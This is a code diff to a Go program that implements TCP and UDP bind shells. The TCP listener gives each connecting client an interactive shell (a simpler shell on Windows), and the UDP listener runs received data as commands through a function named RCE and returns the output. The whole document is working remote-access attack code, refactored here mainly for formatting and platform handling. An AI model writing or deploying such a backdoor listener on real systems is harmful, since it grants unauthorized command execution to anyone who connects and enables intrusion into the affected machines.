@@ -1,8 +1,9 @@
 package main
 
 import (
-	"net"
 	"log"
+	"net"
+	"runtime"
 )
 
 func TCPBind(config Config) {
@@ -14,30 +15,21 @@ func TCPBind(config Config) {
 	log.Println("Listening on " + config.Address)
 
 	for {
-        conn, err := listener.Accept()
-        if err != nil {
-            log.Println(err)
-        }
+		conn, err := listener.Accept()
+		if err != nil {
+			log.Println(err)
+		}
 
 		conn.Write([]byte("Connection received on " + conn.RemoteAddr().String() + "\n"))
-        
-		for {
-			buffer := make([]byte, MAXBUFFERSIZE)
-			length, err := conn.Read(buffer)
-			if err != nil {
-				break
-			}
-	
-			if length == 0 {
-				continue
-			}
 
-			output := Shell(config.Shell, buffer[:length-1])
-			conn.Write(output)
+		if runtime.GOOS != "windows" {
+			InteractiveShell(config.Shell, conn)
+		} else {
+			DumbShell(config.Shell, conn)
 		}
-	
+
 		conn.Close()
-    }
+	}
 }
 
 func UDPBind(config Config) {
@@ -50,16 +42,16 @@ func UDPBind(config Config) {
 
 	for {
 		buffer := make([]byte, MAXBUFFERSIZE)
-        length, addr, err := listener.ReadFrom(buffer)
-        if err != nil {
-            log.Println(err)
-        }
+		length, addr, err := listener.ReadFrom(buffer)
+		if err != nil {
+			log.Println(err)
+		}
 
 		if length == 0 {
 			continue
 		}
 
-        output:= Shell(config.Shell, buffer[:length-1])
-        listener.WriteTo(output, addr)
-    }
+		output := RCE(config.Shell, buffer[:length-1])
+		listener.WriteTo(output, addr)
+	}
 }
